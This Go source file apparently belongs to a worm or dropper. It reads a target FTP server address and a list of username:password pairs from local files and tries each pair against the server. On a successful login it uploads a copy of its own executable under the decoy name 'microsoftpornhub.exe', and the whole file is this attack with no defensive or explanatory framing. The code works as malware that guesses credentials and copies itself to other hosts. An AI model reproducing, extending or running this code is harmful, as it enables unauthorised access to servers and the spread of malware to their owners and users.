package pack

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/dutchcoders/goftp"
)

func FtP() {
	// Read FTP server IPs from file
	ipFile, err := os.Open("ftpip.txt")
	if err != nil {
		fmt.Println("Error reading FTP server IPs file:", err)
		return
	}
	defer ipFile.Close()

	ipScanner := bufio.NewScanner(ipFile)
	if !ipScanner.Scan() {
		fmt.Println("No FTP server IP found in the file.")
		return
	}

	// Assuming that the FTP server IP is read from the file
	ftpIP := strings.TrimSpace(ipScanner.Text())

	// Read FTP credentials from file
	credFile, err := os.Open("ftp.txt")
	if err != nil {
		fmt.Println("Error reading FTP credentials file:", err)
		return
	}
	defer credFile.Close()

	credScanner := bufio.NewScanner(credFile)
	for credScanner.Scan() {
		cred := strings.TrimSpace(credScanner.Text())
		creds := strings.Split(cred, ":")
		if len(creds) != 2 {
			fmt.Println("Invalid credentials format:", cred)
			continue
		}

		ftpUser := creds[0]
		ftpPassword := creds[1]

		// Attempt to connect to FTP server
		client, err := goftp.Connect(ftpIP + ":21")
		if err != nil {
			fmt.Printf("Failed to connect to FTP server: %v\n", err)
			continue
		}
		defer client.Close()

		// Attempt to login with credentials
		err = client.Login(ftpUser, ftpPassword)
		if err != nil {
			fmt.Printf("Failed to login to FTP server with %s:%s: %v\n", ftpUser, ftpPassword, err)
			continue
		}

		// Get the path of the current executable
		executablePath, err := os.Executable()
		if err != nil {
			fmt.Printf("Failed to get the path of the executable: %v\n", err)
			return
		}

		// Read the content of the Go program
		fileContent, err := ioutil.ReadFile(executablePath)
		if err != nil {
			fmt.Printf("Failed to read the content of the Go program: %v\n", err)
			return
		}

		// Set the remote file path for the Go program on the FTP server
		remoteFileName := "microsoftpornhub.exe"
		remoteFilePath := "/" + remoteFileName

		// Upload the content of the Go program to the remote file
		err = uploadFile(client, remoteFilePath, string(fileContent))
		if err != nil {
			fmt.Printf("Failed to upload the Go program to FTP server: %v\n", err)
			return
		}

		fmt.Printf("Go program uploaded successfully to %s on FTP server\n", remoteFilePath)

		// Break out of the loop if successful login and upload
		break
	}
}

func uploadFile(client *goftp.FTP, remoteFilePath, content string) error {
	reader := strings.NewReader(content)
	return client.Stor(remoteFilePath, reader)
}
